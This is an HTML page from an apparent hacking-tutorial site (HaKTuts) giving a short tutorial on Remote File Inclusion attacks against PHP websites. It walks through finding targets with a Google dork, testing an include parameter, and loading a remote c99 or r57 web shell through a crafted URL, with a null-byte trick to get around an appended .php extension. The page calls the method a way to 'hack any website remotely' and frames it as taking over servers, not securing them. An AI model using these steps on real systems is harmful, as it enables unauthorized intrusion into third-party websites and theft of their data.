<!DOCTYPE html>
<html lang="en">
<head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
	<title>Remote Attack</title>
	<base href="{{base_url}}" />
			<meta name="viewport" content="width=1333" />
		<meta name="description" content="How to hack any website remotely" />
	<meta name="keywords" content="How to hack any website remotely" />
		<meta name="generator" content="Zyro - Website Builder" />
	
	<link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<link href="css/bootstrap-responsive.min.css" rel="stylesheet" type="text/css" />
	<script src="js/jquery-1.8.3.min.js" type="text/javascript"></script>
	<script src="js/bootstrap.min.js" type="text/javascript"></script>
	<script src="js/main.js" type="text/javascript"></script>

	<link href="css/site.css?v=1.0.12" rel="stylesheet" type="text/css" />
	<link href="css/common.css?ts=1433701547" rel="stylesheet" type="text/css" />
	<link href="css/39.css?ts=1433701547" rel="stylesheet" type="text/css" />
	<link rel="shortcut icon" href="http://haktuts.com/gallery/icon-ts1413278622.png" type="image/png" /><meta name="google-site-verification" content="google6bc4eec58925fc74.html" />
	<script type="text/javascript">var currLang = '';</script>		
	<!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
	<!--[if lt IE 9]>
	  <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->
</head>


<body>{{ga_code}}<div class="root"><div class="vbox wb_container" id="wb_header">
	
<div id="wb_element_instance1706" class="wb_element"><ul class="hmenu"><li><a href="Home/" target="_self" title="Home">Home</a></li><li><a href="Free-ethical-hacking-course-online/" target="_self" title="Ethical Hacking">Ethical Hacking</a></li><li><a href="Linux/" target="_self" title="Linux">Linux</a></li><li><a href="Tips-and-tricks/" target="_self" title="Tips and Trick ">Tips and Trick </a><ul><li><a href="how-to-share-internet-without-wifi/" target="_self" title="Windows">Windows</a></li><li><a href="basic-windows-command/" target="_self" title="Windows Shortcut">Windows Shortcut</a></li><li><a href="top-20-notepad-trick/" target="_self" title="Notepad Hacking">Notepad Hacking</a></li><li><a href="list-of-top-cydia-tweaks-for-ios/" target="_self" title="iOS">iOS</a></li><li><a href="how-to-install-kali-linux-nethunter/" target="_self" title="Android">Android</a></li></ul></li><li><a href="download-all-hacking-tools/" target="_self" title="Download">Download</a></li><li><a href="Contact-us/" target="_self" title="Contact us">Contact us</a></li><li><a href="Book/" target="_self" title="Book">Book</a></li><li><a href="Earn-Money/" target="_self" title="Earn Money">Earn Money</a></li><li><a href="http://haktuts.blogspot.in" target="_self" title="Blog">Blog</a></li><li><a href="https://cse.google.com/cse/publicurl?cx=001639366659799729802:vr921b1tgry#gsc.tab=0&amp;gsc.q=haktuts&amp;gsc.sort=" target="_blank" title="Hackers Search Engine">Hackers Search Engine</a></li></ul></div><div id="wb_element_instance1707" class="wb_element"><div></div></div><div id="wb_element_instance1708" class="wb_element"><a class="wb_button" href="Home/"><span>HaKTuts</span></a></div><div id="wb_element_instance1713" class="wb_element"><a class="wb_button" href=""><span>HaKTuts</span></a></div></div>
<div class="vbox wb_container" id="wb_main">
	
<div id="wb_element_instance1709" class="wb_element" style=" overflow: hidden;"><script id="airpushScript" type="text/javascript" src="//ab.airpush.com/apportal/client/airpush.js?siteid=263411&amp;testmode=0&amp;banner360=1&amp;banner=slot1&amp;placementid=0&amp;tp=0">
</script><style type="text/css">
            button{
                width: 250px;
                height: 250px;
                
            }
            table{
                border: 0;

            }
            body{
                margin: 0;
                padding: 0;
            }
        </style><table><tbody><tr><td id="error" style="color: red">
                          <img src="https://airpushmarketing.s3.amazonaws.com/abstract_examples_web.gif" width="250px"></td>
                    </tr></tbody></table></div><div id="wb_element_instance1710" class="wb_element"><div style="font-size: 1px; overflow: hidden; line-height: 1px; padding: 0; background: transparent; float: none; position: relative; margin: 1px 0 0 0; width: 100%; height: 1px; left: 0; top: 50%; border-top: 1px solid #303030;"></div></div><div id="wb_element_instance1711" class="wb_element"><!-- Tags Code For AdPrimary.Com -->
<script type="text/javascript">
document.write('<s'+'cript src="http://c.pioneeringad.com/?adid=8905&adtp=banner&adsz=1&adrd='+new Date().getTime()+'" type="text/javascript">'+'cript>');
</script><!-- End Tags AdPrimary.Com --></div><div id="wb_element_instance1714" class="wb_element" style=" line-height: normal;"><h1 class="wb-stl-heading1">Remote File Inclusion</h1>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal">Remote File Inclusion occurs when a remote file, usually a shell (a graphical interface for browsing remote files and running your own code on a server), is included into a website which allows the hacker to execute server side commands as the current logged on user, and have access to files on the server. With this power the hacker can continue on to use local exploits to escalate his privileges and take over the whole system.</p>

<p class="wb-stl-normal">Many servers are vulnerable to this kind of attack because of PHP’s default settings of register_globals and allow_url_fopen being enabled. Although as of PHP 6.0, register_globals has been depreciated and removed, many websites still rely on older versions of PHP to run their web applications. Now let’s go through the steps a hacker would take to exploit this type of vulnerability in a website.</p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal">First the hacker would find a website that gets its pages via the PHP include() function and is vulnerable to RFI. Many hackers use Google dorks to locate servers vulnerable to RFI. A Google dork is the act of using Google’s provided search tools to help get a specific search result</p>

<p class="wb-stl-normal"><br>
2. Website that include pages have a navigation system similar to: http://target-site.com/index.php?page=PageName</p>

<p class="wb-stl-normal"><br>
3. To see if a the page is vulnerable, the hacker would try to include a site instead of PageName like the following:http://target-site.com/index.php?page=http://www.google.com</p>

<p class="wb-stl-normal"><br>
4. If google shows up then the website is vulnerable thats our profit . and we will continue to upload the shell.</p>

<p class="wb-stl-normal"><br>
5. A elite hacker will program his own shell but a script kidie would just grab a shell from google and upload it some of the popular shells c99 and r57 just google them and get em. At the end of the URL make sure to add a ? so that if anything comes after c99.txt ,it will be passed to the shell and not cause any problems. The new URL will look like : http://target-site.com/index.php?page=http://site.com/c99.txt?<br>
Sometimes the PHP script on the server appends “.php” to the end of every included file. So if you included the shell, it would end up looking like “c99.txt.php” and not work. To get around this, you would add a null byte (%00) to the end of c99.txt. This tells the server to ignore everything after c99.txt</p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal">Note: you can also search the sites vulnerable to this type of attack by using a google dork. Just type this in google search and all sites vulnerable to this attack will come up allinurl:.php?page=  and if you succeed in getting the server to parse the shell.</p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"> </p>

<p class="wb-stl-normal"> </p>
</div><div id="wb_element_instance1715" class="wb_element" style="width: 100%;">
			<?php
				global $show_comments;
				if (isset($show_comments) && $show_comments) {
					renderComments(39);
			?>
			<script type="text/javascript">
				$(function() {
					var block = $("#wb_element_instance1715");
					var comments = block.children(".wb_comments").eq(0);
					var contentBlock = $("#wb_main");
					contentBlock.height(contentBlock.height() + comments.height());
				});
			</script>
			<?php
				} else {
			?>
			<script type="text/javascript">
				$(function() {
					$("#wb_element_instance1715").hide();
				});
			</script>
			<?php
				}
			?>
			</div></div>
<div class="vbox wb_container" id="wb_footer" style="height: 161px;">
	
<div id="wb_element_instance1712" class="wb_element" style=" line-height: normal;"><h4 class="wb-stl-pagetitle">haktuts © 2014. All Rights Reserved </h4>
</div><div id="wb_element_instance1716" class="wb_element" style="text-align: center; width: 100%;"><div class="wb_footer"></div><script type="text/javascript">
			$(function() {
				var footer = $(".wb_footer");
				var html = (footer.html() + "").replace(/^\s+|\s+$/g, "");
				if (!html) {
					footer.parent().remove();
					footer = $("#wb_footer");
					footer.height(100);
				}
			});
			</script></div></div><div class="wb_sbg"></div></div></body>
</html>